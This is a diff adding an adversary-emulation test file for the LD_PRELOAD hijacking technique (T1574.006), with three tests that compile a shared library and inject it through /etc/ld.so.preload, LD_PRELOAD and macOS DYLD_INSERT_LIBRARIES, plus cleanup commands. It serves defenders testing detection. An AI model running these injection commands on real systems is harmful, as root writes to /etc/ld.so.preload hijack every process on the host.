@@ -1,0 +1,99 @@
+attack_technique: T1574.006
+display_name: 'Hijack Execution Flow: LD_PRELOAD'
+atomic_tests:
+- name: Shared Library Injection via /etc/ld.so.preload
+  auto_generated_guid: 39cb0e67-dd0d-4b74-a74b-c072db7ae991
+  description: |
+    This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.
+
+    Upon successful execution, bash will echo `../bin/T1574.006.so` to /etc/ld.so.preload. 
+  supported_platforms:
+  - linux
+  input_arguments:
+    path_to_shared_library_source:
+      description: Path to a shared library source code
+      type: path
+      default: PathToAtomicsFolder/T1574.006/src/Linux/T1574.006.c
+    path_to_shared_library:
+      description: Path to a shared library object
+      type: path
+      default: /tmp/T1574006.so
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      The shared library must exist on disk at specified location (#{path_to_shared_library})
+    prereq_command: |
+      if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;
+    get_prereq_command: |
+      gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}
+  executor:
+    command: |
+      sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'
+    cleanup_command: |
+      sudo sed -i 's##{path_to_shared_library}##' /etc/ld.so.preload
+    name: bash
+    elevation_required: true
+- name: Shared Library Injection via LD_PRELOAD
+  auto_generated_guid: bc219ff7-789f-4d51-9142-ecae3397deae
+  description: |
+    This test injects a shared object library via the LD_PRELOAD environment variable to execute. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.
+
+    Upon successful execution, bash will utilize LD_PRELOAD to load the shared object library `/etc/ld.so.preload`. Output will be via stdout.
+  supported_platforms:
+  - linux
+  input_arguments:
+    path_to_shared_library_source:
+      description: Path to a shared library source code
+      type: path
+      default: PathToAtomicsFolder/T1574.006/src/Linux/T1574.006.c
+    path_to_shared_library:
+      description: Path to a shared library object
+      type: path
+      default: /tmp/T1574006.so
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      The shared library must exist on disk at specified location (#{path_to_shared_library})
+    prereq_command: |
+      if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;
+    get_prereq_command: |
+      gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}
+  executor:
+    command: |
+      LD_PRELOAD=#{path_to_shared_library} ls
+    name: bash
+- name: Dylib Injection via DYLD_INSERT_LIBRARIES
+  auto_generated_guid: 4d66029d-7355-43fd-93a4-b63ba92ea1be
+  description: |
+    injects a dylib that opens calculator via env variable
+  supported_platforms:
+  - macos
+  input_arguments:
+    file_to_inject:
+      description: Path of executable to be injected. Mostly works on non-apple default apps.
+      type: path
+      default: /Applications/Firefox.app/Contents/MacOS/firefox
+    source_file:
+      description: Path of c source file
+      type: path
+      default: PathToAtomicsFolder/T1574.006/src/MacOS/T1574.006.c
+    dylib_file:
+      description: Path of dylib file
+      type: path
+      default: /tmp/T1574006MOS.dylib
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      Compile the dylib from (#{source_file}). Destination is #{dylib_file}
+    prereq_command: |
+      gcc -dynamiclib #{source_file} -o #{dylib_file}
+    get_prereq_command: |
+      gcc -dynamiclib #{source_file} -o #{dylib_file}
+  executor:
+    command: |
+      DYLD_INSERT_LIBRARIES=#{dylib_file} #{file_to_inject}
+    cleanup_command: |
+      kill `pgrep Calculator`
+      kill `pgrep firefox`
+    name: bash
+    elevation_required: false
